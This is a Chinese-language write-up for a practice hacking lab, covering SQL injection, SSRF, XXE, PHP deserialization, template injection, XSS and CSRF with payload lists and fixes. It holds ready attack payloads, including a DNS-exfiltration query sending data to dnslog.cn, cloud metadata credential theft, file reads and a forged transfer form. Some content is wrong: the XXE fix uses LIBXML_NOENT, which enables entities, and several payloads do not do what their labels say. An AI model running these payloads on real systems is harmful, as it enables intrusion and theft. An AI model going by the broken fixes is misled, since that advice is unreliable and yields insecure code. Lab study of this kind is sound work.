# 安全靶场漏洞攻防 Writeup

## 目录

1. [SQL 注入漏洞](#1-sql-注入漏洞)
2. [SSRF 内网攻击](#2-ssrf-内网攻击)
3. [XXE 漏洞](#3-xxe-漏洞)
4. [反序列化漏洞](#4-反序列化漏洞)
5. [SSTI 模板注入](#5-ssti-模板注入)
6. [XSS 跨站脚本](#6-xss-跨站脚本)
7. [CSRF 跨站请求伪造](#7-csrf-跨站请求伪造)
8. [Web 漏洞综合](#8-web-漏洞综合)

---

## 1. SQL 注入漏洞

### 1.1 基础 SQL 注入

**漏洞描述**
基础 SQL 注入是最常见也最直接的 SQL 注入漏洞类型，发生在应用程序将用户输入直接拼接到 SQL 语句中而未进行任何过滤或参数化处理的情况。

**漏洞源码示例**
```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id=$id";
$result = $conn->query($sql);
```

**漏洞测试**

访问靶场页面：`http://靶场地址/sqli/01_basic_injection.php`

**判断注入点**

正常查询：`?id=1`
```sql
SELECT * FROM users WHERE id=1
```

布尔盲注测试：`?id=1 AND 1=1`
```sql
SELECT * FROM users WHERE id=1 AND 1=1 -- 返回正常
```

```sql
SELECT * FROM users WHERE id=1 AND 1=2 -- 返回错误
```

**UNION 注入**

判断列数：`?id=1 UNION SELECT 1,2,3,4`
```sql
SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3,4
```

获取数据库信息：`?id=0 UNION SELECT 1,version(),database(),user()`
```sql
SELECT * FROM users WHERE id=0 UNION SELECT 1,version(),database(),user()
```

**常用 Payload**

```bash
# 基础注入
1 OR 1=1
1 --
1 #

# UNION 注入
0 UNION SELECT 1,2,3,4
0 UNION SELECT id,username,password,email FROM users

# 布尔盲注
1 AND 1=1
1 AND 1=2

# 时间盲注
1 AND SLEEP(5)
```

**修复建议**
```php
// 使用参数化查询
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();
```

### 1.2 报错注入

**漏洞描述**
当应用程序将数据库错误信息直接返回给用户时，攻击者可以利用数据库错误信息来获取敏感数据。

**漏洞测试**

访问靶场页面：`http://靶场地址/sqli/02_error_injection.php`

**常用 Payload**

```bash
# MySQL 报错注入
1 AND UPDATEXML(1,CONCAT(0x7e,version()),1)
1 AND EXTRACTVALUE(1,CONCAT(0x7e,database()))
1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)),1)
```

**获取数据库名**
```sql
SELECT * FROM users WHERE id=1 AND UPDATEXML(1,CONCAT(0x7e,database()),1)
```

**获取表名**
```sql
SELECT * FROM users WHERE id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)),1)
```

**获取列名**
```sql
SELECT * FROM users WHERE id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)),1)
```

**修复建议**
- 关闭数据库错误信息显示
- 使用参数化查询
- 自定义错误页面

### 1.3 布尔盲注

**漏洞描述**
当应用程序不会返回明确的错误信息或查询结果，但会基于查询结果返回不同的页面内容时，可以使用布尔盲注技术。

**漏洞测试**

访问靶场页面：`http://靶场地址/sqli/03_boolean_blind.php`

**判断注入**
```bash
# 正常返回
?id=1 AND 1=1

# 错误返回（无数据或错误）
?id=1 AND 1=2
```

**自动化脚本示例**
```python
import requests

def boolean_blind_injection(url):
    result = ""
    for i in range(1, 50):
        for ascii_val in range(32, 127):
            payload = f"1 AND ASCII(SUBSTRING((SELECT database()),{i},1))={ascii_val}"
            response = requests.get(f"{url}?id={payload}")
            if "查询结果" in response.text:
                result += chr(ascii_val)
                print(f"Found: {result}")
                break
    return result
```

### 1.4 时间盲注

**漏洞描述**
当应用程序既不返回错误信息也不基于查询结果显示不同内容时，可以使用时间盲注。通过让数据库执行延时操作来判断条件真假。

**漏洞测试**

访问靶场页面：`http://靶场地址/sqli/04_time_blind.php`

**判断注入点**
```bash
# 如果页面响应延迟5秒，说明存在注入
?id=1 AND SLEEP(5)
```

**获取数据库名**
```sql
1 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)
```

**DNS 外带数据**
```sql
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.dnslog.cn\\abc'))
```

### 1.5 绕过过滤

**漏洞描述**
WAF 或应用程序可能会对用户输入进行过滤，但过滤规则可能存在绕过方式。

**常见绕过方式**

```bash
# 注释绕过
1 /*!UNION*/ SELECT
1 UN/**/ION SELECT
1 /**/AND/**/ 1=1

# 大小写绕过
uNiOn SeLeCt
AnD 1=1

# 双重 URL 编码
%2527 -> %27 -> '

# 空格绕过
/**/AND/**/
()AND()
%09SLEEP(5)

# 关键字替换
UNION -> UN/**/ION
SLEEP() -> BENCHMARK()
```

### 1.6 UNION 注入

**漏洞描述**
UNION 注入允许攻击者将恶意查询结果附加到原始查询之后。

**漏洞测试**

访问靶场页面：`http://靶场地址/sqli/06_union_injection.php`

**判断列数**
```bash
?id=1 ORDER BY 1
?id=1 ORDER BY 2
?id=1 ORDER BY 3
# 直到报错，确定列数
```

**获取数据**
```bash
?id=0 UNION SELECT 1,2,3,4
?id=0 UNION SELECT id,username,password,email FROM users
?id=0 UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables
```

**修复建议**
- 使用参数化查询
- 限制返回结果数量
- 对输入进行严格验证

---

## 2. SSRF 内网攻击

### 2.1 漏洞描述

服务器端请求伪造（Server-Side Request Forgery，SSRF）是一种由攻击者构造请求，由服务器端发起请求的安全漏洞。攻击者能够通过构造恶意请求，访问本不应该访问的内部资源。

### 2.2 内网资产探测

**漏洞测试**

访问靶场页面：`http://靶场地址/ssrf/06_internal_target.php`

**探测内网 Web 服务**
```bash
# 探测内部管理系统
?url=http://192.168.100.10/admin
?url=http://192.168.100.10:80/internal

# 探测文件服务器
?url=http://192.168.100.20/index.php
?url=http://192.168.100.20:80

# 探测元数据服务
?url=http://192.168.100.21/metadata
?url=http://metadata.google.internal/latest/meta-data/
```

### 2.3 利用协议

**HTTP/HTTPS 协议**
```bash
?url=http://内部服务地址
?url=https://内部服务地址
```

**File 协议**
```bash
?url=file:///etc/passwd
?url=file:///var/www/html/config.php
```

**Dict 协议**
```bash
?url=dict://192.168.1.1:6379/info
?url=dict://192.168.100.20:6379/KEYS *
```

**Gopher 协议**
```bash
?url=gopher://192.168.100.16:6379/_*1%0d%0a$3%0d%0aflash%0d%0a
```

### 2.4 云服务元数据利用

**AWS 元数据服务**
```bash
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/user-data/
```

**获取 IAM 凭证**
```bash
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WebRole
```

### 2.5 内网 Redis 利用

**写入 WebShell**
```bash
?url=gopher://192.168.100.20:6379/_*1%0d%0a$3%0d%0aflash%0d%0a
```

### 2.6 修复建议

```php
// 验证用户输入的 URL
function validate_url($url) {
    $parsed = parse_url($url);
    if (!in_array($parsed['scheme'], ['http', 'https'])) {
        return false;
    }
    $host = $parsed['host'];
    // 禁止内网 IP
    if (filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) {
        return false;
    }
    // 禁止本地地址
    if ($host === 'localhost' || $host === '127.0.0.1') {
        return false;
    }
    return true;
}
```

---

## 3. XXE 漏洞

### 3.1 漏洞描述

XML 外部实体（XML External Entity，XXE）漏洞发生在应用程序解析 XML 输入时，没有正确限制外部实体的加载，导致攻击者可以读取服务器上的敏感文件或执行内部请求。

### 3.2 漏洞测试

访问靶场页面：`http://靶场地址/xxe/`

### 3.3 读取本地文件

**恶意 XML  payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### 3.4 SSRF 探测内网

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://192.168.100.10/admin">
]>
<foo>&xxe;</foo>
```

### 3.5 修复建议

```php
// 禁用外部实体
libxml_disable_entity_loader(true);

// 使用 DOMDocument 的替代方案
$xml = simplexml_load_string($xmlString, 'SimpleXMLElement', LIBXML_NOENT);
```

---

## 4. 反序列化漏洞

### 4.1 漏洞描述

反序列化漏洞发生在应用程序将不可信的用户输入反序列化为对象时，攻击者可以构造恶意序列化数据来执行任意代码。

### 4.2 漏洞测试

访问靶场页面：`http://靶场地址/unserialize/`

### 4.3 PHP 反序列化利用

**构造恶意 Payload**
```php
class RCE {
    public $cmd;
    function __destruct() {
        system($this->cmd);
    }
}

$payload = serialize(new RCE());
echo urlencode($payload);
```

### 4.4 魔法方法利用

常见的魔法方法包括：
- `__construct()` - 对象创建时
- `__destruct()` - 对象销毁时
- `__wakeup()` - 反序列化时
- `__toString()` - 对象被当作字符串时

### 4.5 修复建议

- 避免反序列化用户输入
- 使用 JSON 替代 PHP 序列化
- 对反序列化数据进行签名验证

---

## 5. SSTI 模板注入

### 5.1 漏洞描述

服务器端模板注入（Server-Side Template Injection，SSTI）发生在应用程序使用模板引擎时，将用户输入直接拼接到模板中而未进行适当过滤。

### 5.2 漏洞测试

访问靶场页面：`http://靶场地址/ssti/`

### 5.3 检测方法

```bash
# Flask/Jinja2
{{7*7}}
{{config}}

# PHP/Twig
{{7*7}}
{{_self}}
```

### 5.4 获取 shell

```python
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
```

### 5.5 修复建议

```python
# 使用 Jinja2 的安全实践
from jinja2 import Template

template = Template("Hello {{ name }}")
template.render(name="World")
```

---

## 6. XSS 跨站脚本

### 6.1 漏洞描述

跨站脚本（Cross-Site Scripting，XSS）允许攻击者在受害者的浏览器中执行恶意 JavaScript 代码。

### 6.2 漏洞测试

访问靶场页面：`http://靶场地址/xss/`

### 6.3 反射型 XSS

```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 6.4 存储型 XSS

在留言板、评论等位置提交恶意代码，代码会被存储在服务器中。

### 6.5 DOM 型 XSS

```javascript
var url = document.location.href;
document.write(url);
```

### 6.6 修复建议

```php
// HTML 实体编码
htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// Content Security Policy
header("Content-Security-Policy: script-src 'self'");
```

---

## 7. CSRF 跨站请求伪造

### 7.1 漏洞描述

跨站请求伪造（Cross-Site Request Forgery，CSRF）利用用户已登录的身份，诱导用户访问恶意页面，自动执行非法操作。

### 7.2 漏洞测试

访问靶场页面：`http://靶场地址/csrf/`

### 7.3 攻击示例

```html
<img src="http://target.com/change-password?newpass=hacked">
```

```html
<form action="http://target.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

### 7.4 修复建议

```php
// 使用 CSRF Token
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
$token = $_SESSION['csrf_token'];

// 验证 Token
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('CSRF token validation failed');
}
```

---

## 8. Web 漏洞综合

### 8.1 CTF 综合靶场

访问靶场页面：`http://靶场地址/ctflab/`

**解题思路**
1. 信息收集 - 扫描目录、端口
2. 漏洞挖掘 - 发现注入点、XSS 等
3. 漏洞利用 - 获取敏感信息或 shell
4. 权限提升 - 横向移动

### 8.2 通用渗透测试框架

```
信息收集 -> 漏洞扫描 -> 漏洞利用 -> 权限维持 -> 痕迹清理
```

### 8.3 常用工具

- **信息收集**：nmap, masscan, dirb
- **漏洞扫描**：nikto, sqlmap, burpsuite
- **漏洞利用**：metasploit, burpsuite repeater
- **Web Shell**：蚁剑、冰蝎、哥斯拉

---

## 免责声明

本 Writeup 仅供学习安全技术和研究使用，请勿用于非法用途。使用本靶场进行安全测试时，请确保已获得适当授权。

---

*最后更新：2026-03-23*
